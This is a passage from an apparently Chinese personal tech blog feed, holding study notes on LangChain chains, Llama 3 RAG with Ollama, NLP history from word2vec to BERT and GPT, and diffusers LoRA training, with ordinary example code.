class="keyword">import</span> ChatPromptTemplate</span><br><span class="line"><span class="keyword">from</span> langchain_core.runnables <span class="keyword">import</span> RunnableParallel, RunnablePassthrough</span><br><span class="line"><span class="keyword">from</span> langchain_community.chat_models.ollama <span class="keyword">import</span> ChatOllama</span><br><span class="line"><span class="keyword">from</span> langchain_community.embeddings.ollama <span class="keyword">import</span> OllamaEmbeddings</span><br><span class="line"></span><br><span class="line">vectorstore = DocArrayInMemorySearch.from_texts(</span><br><span class="line">    [<span class="string">&#x27;harrison worked at kensho&#x27;</span>, <span class="string">&#x27;bears like to eat honey&#x27;</span>],</span><br><span class="line">    embedding=OllamaEmbeddings(),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">retriever = vectorstore.as_retriever()</span><br><span class="line">template = <span class="string">&#x27;&#x27;&#x27;Answer the question based only on the following context:</span></span><br><span class="line"><span class="string">&#123;context&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Question: &#123;question&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">prompt = ChatPromptTemplate.from_template(template)</span><br><span class="line"><span class="comment"># chatmodel = ChatOllama(model=&#x27;llama3&#x27;, keep_alive=-1)</span></span><br><span class="line"></span><br><span class="line">output_parser = StrOutputParser()</span><br><span class="line">setup_and_retrieval = RunnableParallel(</span><br><span class="line">    &#123;<span class="string">&#x27;context&#x27;</span>: retriever, <span class="string">&#x27;question&#x27;</span>: RunnablePassthrough()&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">chain = setup_and_retrieval | prompt | chatmodel | output_parser</span><br><span class="line">chain.invoke(<span class="string">&#x27;what did bear eat?&#x27;</span>)</span><br><span class="line"><span class="comment"># &#x27;According to the provided context, bears like to eat honey.&#x27;</span></span><br></pre></td></tr></table></figure><p>上述模版接受context和question.</p><ol type="1"><li>首先创造RunnableParallel从文档检索context, 然后RunnablePassthrough输入传入到question</li><li>上述步骤构成的字典传入prompt构成promptValue</li><li>chatmodel接收到promptValue生成chatMessage</li><li>parser接受Message做解析然后输出</li></ol><h3 id="interface">Interface</h3><h4 id="schema">schema</h4><p>schema用于查看输入输出模式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prompt = ChatPromptTemplate.from_template(<span class="string">&quot;tell me a joke about &#123;topic&#125;&quot;</span>)</span><br><span class="line">chain = prompt | chatmodel</span><br><span class="line">chain.input_schema.schema(), chain.output_schema.schema()</span><br></pre></td></tr></table></figure><h4 id="stream">stream</h4><p>流式输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> chain.stream(&#123;<span class="string">&quot;topic&quot;</span>: <span class="string">&quot;bears&quot;</span>&#125;):</span><br><span class="line">    <span class="built_in">print</span>(s.content, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h4 id="invoke-batch">invoke &amp; batch</h4><p>invoke输入执行, batch输入列表执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chain.invoke(&#123;<span class="string">&quot;topic&quot;</span>: <span class="string">&quot;bears&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># AIMessage(content=&#x27;Why did the bear go to the doctor?\n\nBecause it had a grizzly cough!\n\nHope that made you roar with laughter!&#x27;, response_metadata=&#123;&#x27;model&#x27;: &#x27;llama3&#x27;, &#x27;created_at&#x27;: &#x27;2024-04-26T18:59:12.682597827Z&#x27;, &#x27;message&#x27;: &#123;&#x27;role&#x27;: &#x27;assistant&#x27;, &#x27;content&#x27;: &#x27;&#x27;&#125;, &#x27;done&#x27;: True, &#x27;total_duration&#x27;: 2376927414, &#x27;load_duration&#x27;: 780076, &#x27;prompt_eval_duration&#x27;: 104313000, &#x27;eval_count&#x27;: 26, &#x27;eval_duration&#x27;: 2269974000&#125;, id=&#x27;run-1da506c7-4321-43b3-9a20-73e378bb5d53-0&#x27;)</span></span><br><span class="line">chain.batch([&#123;<span class="string">&quot;topic&quot;</span>: <span class="string">&quot;bears&quot;</span>&#125;, &#123;<span class="string">&quot;topic&quot;</span>: <span class="string">&quot;cats&quot;</span>&#125;])</span><br><span class="line"><span class="comment"># [AIMessage(content=&quot;Here&#x27;s one:\n\nWhy did the bear go to the doctor?\n\nBecause it had a grizzly cough!\n\nHope that made you roar with laughter!&quot;, response_metadata=&#123;&#x27;model&#x27;: &#x27;llama3&#x27;, &#x27;created_at&#x27;: &#x27;2024-04-26T18:59:27.384268553Z&#x27;, &#x27;message&#x27;: &#123;&#x27;role&#x27;: &#x27;assistant&#x27;, &#x27;content&#x27;: &#x27;&#x27;&#125;, &#x27;done&#x27;: True, &#x27;total_duration&#x27;: 3058382240, &#x27;load_duration&#x27;: 446359, &#x27;prompt_eval_count&#x27;: 6, &#x27;prompt_eval_duration&#x27;: 415392000, &#x27;eval_count&#x27;: 30, &#x27;eval_duration&#x27;: 2641467000&#125;, id=&#x27;run-8fcefbc7-d3eb-424f-8328-ff1c4c9461c0-0&#x27;),</span></span><br><span class="line"><span class="comment"># AIMessage(content=&#x27;Why did the cat join a band?\n\nBecause it wanted to be the purr-cussionist!\n\nMeow-velous, right?&#x27;, response_metadata=&#123;&#x27;model&#x27;: &#x27;llama3&#x27;, &#x27;created_at&#x27;: &#x27;2024-04-26T18:59:24.325741194Z&#x27;, &#x27;message&#x27;: &#123;&#x27;role&#x27;: &#x27;assistant&#x27;, &#x27;content&#x27;: &#x27;&#x27;&#125;, &#x27;done&#x27;: True, &#x27;total_duration&#x27;: 2914778748, &#x27;load_duration&#x27;: 1199486, &#x27;prompt_eval_count&#x27;: 6, &#x27;prompt_eval_duration&#x27;: 425677000, &#x27;eval_count&#x27;: 29, &#x27;eval_duration&#x27;: 2484935000&#125;, id=&#x27;run-cd7e0e28-818e-4b4b-a5d6-60f71b815bf9-0&#x27;)]</span></span><br></pre></td></tr></table></figure><h4 id="异步">异步</h4><p>上述方法都支持异步:</p><ul><li>astream: 异步流式返回响应的块</li><li>ainvoke: 异步在输入上调用链</li><li>abatch: 异步在输入列表上调用链</li><li>astream_log: 异步流式返回中间步骤，以及最终响应</li><li>astream_events: beta 异步流式返回链中发生的事件（在 langchain-core 0.1.14 中引入）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">for</span> s <span class="keyword">in</span> chain.astream(&#123;<span class="string">&quot;topic&quot;</span>: <span class="string">&quot;bears&quot;</span>&#125;):</span><br><span class="line">    <span class="built_in">print</span>(s.content, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="题外话">题外话</h2><p>看到这里大概已经明白langchain是干啥的了, 想了一下感觉这种用户可以随意输入框架肯定也会有安全问题, 比如如何保证输入是安全的呢. 然后就看到有文章已经讲过了: <a href="https://www.secrss.com/articles/59635">深入剖析大模型安全问题：Langchain框架的隐藏风险</a>.</p><p>CVE-2023-29374: LLMMathChain任意代码执行漏洞. 所以说开发中还是要保留一些安全意识, 尤其是有用户可控行为的时候.</p><p>这里只是langchain的最基础的部分但也是最核心的部分, 后续还会继续看Langchain的剩下一部分文档.</p>]]></content>
      
      
      <categories>
          
          <category> ML NLP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Llama学习以及对大模型的一些思考</title>
      <link href="/2024/04/25/Llama%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
      <url>/2024/04/25/Llama%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<p>最近llama3问世了, 之前了解了一下llama相关, 大概就是一个开源可商用gpt. <a href="https://huggingface.co/meta-llama/Meta-Llama-3-8B">huggingface模型</a>. 然后自己也下载下来尝试了一下, 用ollama就可以直接在自己本机跑,不需要去学校机器了.</p><p><img src="chat_llama.png" /></p><h1 id="unsloth">unsloth</h1><p>unsloth提供更低内存占用,更快训练的finetuning. 官方也给出了<a href="https://colab.research.google.com/drive/135ced7oHytdxu3N2DNe1Z0kqjyYIkDXp?usp=sharing">Llama-3 8b的notebook</a>,可以自己调整.</p><p>简单的对比,没有做lora之前</p><p><img src="untrained_ruozhiba.png" /></p><p>做了简单的finetuning之后</p><p><img src="trained_ruozhiba.png" /></p><h1 id="rag">RAG</h1><p><a href="https://www.youtube.com/watch?v=T-D1OfcDW1M">What is Retrieval-Augmented Generation (RAG)?</a></p><p>至于实现,youtube上也有相应教学<a href="https://www.youtube.com/watch?v=O7RdEyRsatw">Llama 3 RAG: How to Create AI App using Ollama?</a>. 讲的非常好, 记录一下.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gradio <span class="keyword">as</span> gr</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"><span class="keyword">from</span> langchain.text_splitter <span class="keyword">import</span> RecursiveCharacterTextSplitter</span><br><span class="line"><span class="keyword">from</span> langchain_community.document_loaders <span class="keyword">import</span> WebBaseLoader</span><br><span class="line"><span class="keyword">from</span> langchain_community.vectorstores <span class="keyword">import</span> Chroma</span><br><span class="line"><span class="keyword">from</span> langchain_community.embeddings <span class="keyword">import</span> OllamaEmbeddings</span><br><span class="line"><span class="keyword">import</span> ollama</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to load, split, and retrieve documents</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_and_retrieve_docs</span>(<span class="params">url</span>):</span><br><span class="line">    loader = WebBaseLoader(</span><br><span class="line">        web_paths=(url,),</span><br><span class="line">        bs_kwargs=<span class="built_in">dict</span>() </span><br><span class="line">    )</span><br><span class="line">    docs = loader.load()</span><br><span class="line">    text_splitter = RecursiveCharacterTextSplitter(chunk_size=<span class="number">1000</span>, chunk_overlap=<span class="number">200</span>)</span><br><span class="line">    splits = text_splitter.split_documents(docs)</span><br><span class="line">    embeddings = OllamaEmbeddings(model=<span class="string">&quot;nomic-embed-text&quot;</span>)</span><br><span class="line">    vectorstore = Chroma.from_documents(documents=splits, embedding=embeddings)</span><br><span class="line">    <span class="keyword">return</span> vectorstore.as_retriever()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to format documents</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_docs</span>(<span class="params">docs</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\n\n&quot;</span>.join(doc.page_content <span class="keyword">for</span> doc <span class="keyword">in</span> docs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function that defines the RAG chain</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rag_chain</span>(<span class="params">url, question</span>):</span><br><span class="line">    retriever = load_and_retrieve_docs(url)</span><br><span class="line">    retrieved_docs = retriever.invoke(question)</span><br><span class="line">    formatted_context = format_docs(retrieved_docs)</span><br><span class="line">    formatted_prompt = <span class="string">f&quot;Question: <span class="subst">&#123;question&#125;</span>\n\nContext: <span class="subst">&#123;formatted_context&#125;</span>&quot;</span></span><br><span class="line">    response = ollama.chat(model=<span class="string">&#x27;llama3&#x27;</span>, messages=[&#123;<span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: formatted_prompt&#125;])</span><br><span class="line">    <span class="keyword">return</span> response[<span class="string">&#x27;message&#x27;</span>][<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Gradio interface</span></span><br><span class="line">iface = gr.Interface(</span><br><span class="line">    fn=rag_chain,</span><br><span class="line">    inputs=[<span class="string">&quot;text&quot;</span>, <span class="string">&quot;text&quot;</span>],</span><br><span class="line">    outputs=<span class="string">&quot;text&quot;</span>,</span><br><span class="line">    title=<span class="string">&quot;RAG Chain Question Answering&quot;</span>,</span><br><span class="line">    description=<span class="string">&quot;Enter a URL and a query to get answers from the RAG chain.&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Launch the app</span></span><br><span class="line">iface.launch()</span><br></pre></td></tr></table></figure><p>其中prompt可以从langchain hub里拉取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain <span class="keyword">import</span> hub</span><br><span class="line"></span><br><span class="line">prompt = hub.pull(<span class="string">&quot;rlm/rag-prompt&quot;</span>)</span><br><span class="line">example_messages = prompt.invoke(</span><br><span class="line">    &#123;<span class="string">&quot;context&quot;</span>: <span class="string">&quot;filler context&quot;</span>, <span class="string">&quot;question&quot;</span>: <span class="string">&quot;filler question&quot;</span>&#125;</span><br><span class="line">).to_messages()</span><br><span class="line">example_messages</span><br><span class="line"><span class="comment"># [HumanMessage(content=&quot;You are an assistant for question-answering tasks. Use the following pieces of retrieved context to answer the question. If you don&#x27;t know the answer, just say that you don&#x27;t know. Use three sentences maximum and keep the answer concise.\nQuestion: filler question \nContext: filler context \nAnswer:&quot;)]</span></span><br></pre></td></tr></table></figure><p>就用ibm那位女士讲的moon的例子,错误网站得到错误答案. <img src="wrong_answer_moon.png" /></p><p>正确网站能够得出正确答案 <img src="real_ans.png" /></p><p>不过具体工作过程还是会有一些出入, 这里前面可以看到query的信息存到了vector database里面, 不知道是不是同时存了几个信息导致回答总是不稳定(有时候Jupiter有时候Saturn). 包括如果一旦喂了bbc的文章之后,哪怕喂过时的文章模型还是返回正确答案Saturn, 不排除多答案返回逻辑存在问题, 也可能是语义识别到了时间差距? 不过总的来说是确实能够从给定源获取新信息, 这其实也就是Rag的目的之一了.</p><h1 id="一点小思考">一点小思考</h1><p>最后简单看了下, 发现其实llama也确实可以做text classification. 官方文档里面的: <a href="https://colab.research.google.com/drive/1ggaa2oRFphdBmqIjSEbnb_HGkcIRC2ZB?usp=sharing#scrollTo=GlxX7p6Jdcmg">A notebook on how to fine-tune the Llama 2 model with QLoRa, TRL, and Korean text classification dataset.</a>.</p><p>之前看了BERT, chatgpt相关, 了解到了它们都是pretrained model, 具备大量语库相关知识. 预训练的方式也都在前面学习过了, 但很容易就会产生一个疑问: BERT基于transformer的encoder部分, 加上全局attention, 再加上mlm, 似乎重点放在了语义理解上(完形填空+不可完全相信给出的context,模型必须具备自己的判断). 与之对比, gpt用的直接是decoder部分, 它的pretrain其实就是mask掉后面的句子对前面做attention然后做文本生成的尝试, 重点放在了文本生成层次.</p><p>那么反过来可不可以呢? 用bert做文本生成,用gpt-like模型做文本分类这种文本理解问题是否可行呢?</p><p>刚开始我的直觉是不太合适吧, 似乎训练方向就不太相同, 但再一想, 两者都基于大量语料学习, 模型参数都是千万/亿级别的, 对其他任务做微调之后应该也存在兼容性吧.</p><p>于是尝试找了一些资料. 首先在huggingface文档里找到了一个<a href="https://huggingface.co/docs/transformers/model_doc/bert-generation">bertGeneration模型</a>, 说明bert做NLG确实是可行的, 有人也做过类似的事情.</p><p>与之相对, gpt-like模型是否可以做NLU相关任务呢? 其实也是有的<a href="https://huggingface.co/docs/transformers/model_doc/gpt2#transformers.GPT2ForSequenceClassification">GPT2ForSequenceClassification</a>.</p><p>大概也就应证了前面学习到的:大模型已经学习到了足够的知识? 需要的只是一些特定监督学习让它们能够用到我们所需求的场景?</p><p>后续还会继续学习一下langchain相关, finetuning也可以跟着看一看. 至于prompt engineering其实也是早有耳闻, 不过我觉得不了解之前还是先不说讨厌, 等真正了解工程所做的是什么之后再去讨论这项技术是不是真的有意思.</p>]]></content>
      
      
      <categories>
          
          <category> ML NLP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从RNN到GPT(nlp背景学习)</title>
      <link href="/2024/04/22/%E4%BB%8ERNN%E5%88%B0GPT-nlp%E8%83%8C%E6%99%AF%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/22/%E4%BB%8ERNN%E5%88%B0GPT-nlp%E8%83%8C%E6%99%AF%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>今天本来想补一下NLP尤其是GPT的相关知识,但看到一篇很好的博客讲了NLP领域的发展,这里记录一下.</p><p><a href="https://fancyerii.github.io/2023/02/20/about-chatgpt/">关于ChatGPT的思考</a>.</p><p>写的很长,但是讲清楚了自然语言处理这个领域的每个阶段,能够学习到不少东西.</p><h2 id="deeplearning">DeepLearning</h2><h3 id="word-embedding经历">word embedding经历</h3><p>最开始NLP不同于其他学习类型,NLP的文本类型是离散类型而不是像数字类型一样的连续类型. 处理起来第一步肯定是类型转化,最简单的转化即one-hot. 每个标签算一列,n个标签n个列.</p><p>这就导致one-hot有致命问题,文本如果涉及成千上万的单词,那我们几千几万列的稀疏矩阵,处理起来就很麻烦.</p><p>其次,同种物品或者完全不同的物品在某种程度应该有相同点或区分点,而在one-hot里面就只有0或者1. 比如猫和狗,在one-hot的层面就是完全不同的东西,而不会考虑都是动物类型.</p><p>所以一种更理想的形式,以稠密向量来表示某个词的意义就成为了方向. 由此衍生出了一些处理方式.</p><h4 id="latent-semantic-analysis"><u>Latent Semantic Analysis</u></h4><p>包括occurence matrix和SVD.</p><p>occurence就是行表示词,列表示文档,每个元素表示词和文档的频率关系,有tf,idf,tf-idf等一类.</p><p>SVD即矩阵分解,将矩阵分解为左奇异向量右奇异向量和包含奇异值的对角矩阵,从对角矩阵里面选取k个奇异值最大的元素做相乘从而达到从n维降维到k维的目的.</p><h4 id="word2vec"><u>word2vec</u></h4><p>包含CBOW和Skip-Gram</p><p>CBOW即从context预测center word, Skip-Gram从center word预测context.</p><h4 id="glove"><u>GloVe</u></h4><p>Co-occurence + context window + decreasing weight</p><p>Co-occurence从词库构建矩阵, context window做规定大小内统计, decreasing weight负责在context window中距离不同的权重衰减.</p><h3 id="dnn-cnn-rnn-lstm">DNN-&gt;CNN-&gt;RNN-&gt;LSTM</h3><p>有了word embedding,就可以直接丢上nn进行最初步的训练了.</p><p><strong><u>NN+CNN</u></strong>: 一开始是全连层, 后来CV领域的CNN也进入使用(可以看作是利用卷积获取某种程度的context window从而获取上下文).</p><p><strong><u>RNN</u></strong>: 再之后是RNN, RNN更加优秀的点在于它每一个输出都是基于前面所有的输出, 后续序列的预测保留了前面的"记忆", 所以理论来讲RNN可以训练任意长度序列.</p><p><strong><u>LSTM, GRU</u></strong>: 再之后是LSTM和GRU, 解决的是RNN中梯度消失的问题. 比如LSTM就是通过门控对RNN加上短期记忆的支持和长期记忆的选择遗忘从而解决RNN长度过长的时候会遗忘过去信息的问题, 而GRU是门控简化的LSTM.</p><h3 id="seq2seq-attention">Seq2Seq &amp; Attention</h3><p><strong>Seq2Seq</strong>解决的问题是<strong>文本翻译</strong>或者<strong>从文本生成文本</strong>的问题, 具体做法就是input丢到encoder将输入编码成一个latent vector然后再由decoder对lantent vector进行还原.</p><p><strong>Attention</strong>: 然而把整个长句全部编码到一个latent vector是困难的, 所以这里引入了attention. 即decoder对latent vector进行解码的时候会受到encoder中所有步骤的信息-即注意力权重的影响, 从而decoder知道哪个步骤我需要着重关注而哪些词无关紧要.</p><ul><li>在Encoder-Decoder框架下，Decoder在解码的时候会“注意”到Encoder的隐状态序列，从而利用这些信息更好的解码。</li><li>Encoder会把每一个输入的Token(可以理解为词)都编码成一个向量，在Decoder进行t时刻计算的时候，除了t-1时刻的隐状态和当前时刻的输入，注意力机制还可以参考Encoder所有时刻的输入。比如上面输入是"欢迎 来 北京"，那么在翻译第一个词的注意力可能是这样: (0.7,0.2,0.1)，表示当前最关注的是输入的第一个词，但是也会参考其它的词。假设Encoder的3个输出分别是𝑦1,𝑦2,𝑦3，那么我们可以用attention概率加权得到当前时刻的context向量0.7*𝑦1 + 0.2*𝑦2 + 0.1*𝑦3.</li></ul><h2 id="近代deep-learning">近代Deep Learning</h2><h3 id="transformer">Transformer</h3><p>LSTM搭配Attention来处理Seq2Seq相关问题流行了起来, 但是RNN底层逻辑还是有问题:</p><ol type="1"><li>RNN下一步建立在上一步计算上,所以无法并行</li><li>当前RNN仅单向, 如果文本里面的context在当前时间t之后, 那么模型就无法获得信息.</li></ol><p><img src="animal_street.png" /></p><h4 id="self-attention">Self-Attention</h4><p>Transformer也是来自著名论文<a href="https://arxiv.org/abs/1706.03762">Attention Is All You Need</a>, 该论文提出了使用SelfAttention来取代传统LSTM和GRU.</p><p>在Encoder-Decoder框架下，Decoder在解码的时候会“注意”到Encoder的隐状态序列，从而利用这些信息更好的解码.</p><p>在Transformer中, SelfAttention利用整个序列的embedding来计算当前token的embedding, 即每一个新的embedding都会包含有整个序列的信息.</p><p><span class="math display">\[ x_i’=\sum_{j=1}^{n}w_{ji}x_j \]</span></p><h3 id="插曲">插曲</h3><p><a href="https://fancyerii.github.io/2023/02/20/about-chatgpt/#%E5%BD%93%E6%97%B6%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98">当时存在的问题</a></p><p>作者这里指出当时自然语言处理领域缺少单任务训练数据,导致解决一个问题可能还会连带解决很多中间问题. 作者表示这是技术发展不够的一种表现, 并且正是由于我们没有对专一任务的数据集, 最好的解决方案是能够让模型从无标注的文本中学习.</p><p>确实是正确的思考方式,不过当时我可能连numpy都没用过,就只能体会一下当时的背景了.</p><h3 id="elmo">ELMo</h3><p><a href="https://arxiv.org/abs/1802.05365">Deep contextualized word representations</a>, 给人直观感觉就是解决word vector层面的问题. 其能够基于上下文来从无标注的文本中学习相关Embedding(解决了前面提到的数据稀少问题), 并且能够动态生成词向量供模型使用.</p><p>以前的word embedding主要为了解决两个问题.</p><ol type="1"><li>语法语义, 某词表示什么意思, 有什么特点.</li><li>不同场合的同词使用.</li></ol><p>word2vec和GloVe解决了第一个问题,能够用向量表示某些词的意思,但是依然存在同词不同场景的使用情景. 经典的bank可以指银行也可以是水坝. 但是它们针对同一个确定token的word vector却总是相同的.</p><p>ELMo做出了两方面贡献</p><ol type="1"><li>双向训练, 从前往后训练以及从后往前训练, 从而此token可以获得整个全文的信息而不至于从前往后的时候总是未知后续信息.</li><li>动态embedding</li></ol><p>第一点容易理解, 在base model为LSTM的情况下, 单向训练确实会缺少大于t时间的信息, 双向训练获取全文信息也就容易理解.</p><p>第二点的动态embedding实现就比较巧妙了, token本身从GloVe或者word2vec就生成了自己的embedding, 那我们在针对某个词之前就用一个全连层连接原始的embedding和新产生的context, 从而整合context信息和原始词义达到动态embedding的效果.</p><p>当然ELMo只是一个上游任务, 后续具体任务可以直接搭在ELMo的基础之上.</p><h3 id="gpt">GPT</h3><p>Generative Pre-trained Transformer. 其思想相当于是使用transformer的decoder直接进行文本的生成, 最后依据具体任务对transformer进行finetuning.</p><h4 id="pretraining">Pretraining</h4><p>Pretraining即训练模型使用transformer的decoder直接进行文本的生成.</p><p>但是这里存在问题, transformer的decoder里面用到了全局self attention, 其包含了前后文所有信息, 如果我们预先知道了全文信息那预测就是相当于作弊, 因此在训练的时候我们会对后续输入进行mask, 即下一字符的生成仅仅和前面的字符相关.</p><p>即使用的是Masked Self Attention.</p><h4 id="监督的fine-tuning">监督的Fine-Tuning</h4><p>无监督的Pretraining之后，我们再去针对特定任务进行Fine-Tuning.</p><h3 id="bert">BERT</h3><p><a href="https://arxiv.org/abs/1810.04805">BERT: Pre-training of Deep Bidirectional Transformers for Language Understanding</a> 全称Bidirectional Encoder Representations from Transformers, 即双向的transformer encoder模型.</p><p>在transformer的基础之上, 即往前看也往后看, 整合整个句子的context information.</p><p>然后就是和GPT同样的问题, 如果我们已经具备了全文知识, 那么我们的训练其实是在作弊. 同样BERT也使用了mask.</p><p>举个例子, 一个句子里面我们mask掉15%的token, 那么一旦一个token落在这15%中, 我们可以选择替换成&lt;mask&gt;, 或者替换成其他token,又或者保持原有token, 然后让模型去训练. 此过程即训练模型并不能太过依赖词本身而是要考虑上下文.</p><p>除此之外,BERT还会对序列做Segment的区分, 从而判断两个句子是否是相连的, 甚至可以后续用来做问答使用.</p><h3 id="gpt2-及以后">GPT2 及以后</h3><p>这部分内容挺多的,近期可以把原论文读一读然后再回头来看,毕竟不看论文总感觉少点意思.</p><p>不过NLP的发展之路也挺有意思的, 在此记录一下, 感谢<a href="https://fancyerii.github.io/">李理</a>的精彩记录, 受益匪浅.</p><blockquote><p>https://fancyerii.github.io/2023/02/20/about-chatgpt<br />https://blog.csdn.net/qq_43689179/article/details/98478617<br />https://blog.csdn.net/qq_45848817/article/details/136889730<br />https://www.fanyeong.com/2018/02/19/glove-in-detail/<br />https://github.com/datawhalechina/learn-nlp-with-transformers/blob/main/docs/篇章2-Transformer相关原理/2.4-图解GPT.md</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ML NLP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Diffusers学习(2)-LoRA</title>
      <link href="/2024/04/22/Diffusers%E5%AD%A6%E4%B9%A0-2-LoRA/"/>
      <url>/2024/04/22/Diffusers%E5%AD%A6%E4%B9%A0-2-LoRA/</url>
      
        <content type="html"><![CDATA[<p><a href="https://arxiv.org/abs/2106.09685">LoRA: Low-Rank Adaptation of Large Language Models</a></p><p>最直白的解释就是大模型重新训练因为参数过多过于耗费时间,重新训练来做微调是不可取的.</p><p>更加能接受的方式是我们给模型增加一个adapter来作为辅助模型,我们不用完全重新训练模型,只需要在模型上面把adapter训练好即可让模型能够朝着我们需要的方向工作.</p><blockquote><p>It works by inserting a smaller number of new weights into the model and only these are trained. This makes training with LoRA much faster, memory-efficient, and produces smaller model weights (a few hundred MBs), which are easier to store and share.</p></blockquote><p>官方地址: <a href="https://huggingface.co/docs/diffusers/training/lora">https://huggingface.co/docs/diffusers/training/lora</a></p><h1 id="script-level">script level</h1><h2 id="install">install</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/huggingface/diffusers</span><br><span class="line"><span class="built_in">cd</span> diffusers</span><br><span class="line">pip install .</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> examples/text_to_image</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><h2 id="script">script</h2><p>其实大部分都没啥好看的,主要也就是几个自定义的点</p><h2 id="scheduler-tokenizer">scheduler, tokenizer</h2><p>位置:</p><p><a href="https://github.com/huggingface/diffusers/blob/main/examples/text_to_image/train_text_to_image.py#L567">https://github.com/huggingface/diffusers/blob/main/examples/text_to_image/train_text_to_image.py#L567</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Load scheduler, tokenizer and models.</span></span><br><span class="line">noise_scheduler = DDPMScheduler.from_pretrained(args.pretrained_model_name_or_path, subfolder=<span class="string">&quot;scheduler&quot;</span>)</span><br><span class="line">tokenizer = CLIPTokenizer.from_pretrained(</span><br><span class="line">    args.pretrained_model_name_or_path, subfolder=<span class="string">&quot;tokenizer&quot;</span>, revision=args.revision</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="unet">UNet</h2><p>位置:</p><p><a href="https://github.com/huggingface/diffusers/blob/main/examples/text_to_image/train_text_to_image.py#L599">https://github.com/huggingface/diffusers/blob/main/examples/text_to_image/train_text_to_image.py#L599</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unet = UNet2DConditionModel.from_pretrained(</span><br><span class="line">    args.pretrained_model_name_or_path, subfolder=<span class="string">&quot;unet&quot;</span>, revision=args.non_ema_revision</span><br><span class="line">)</span><br><span 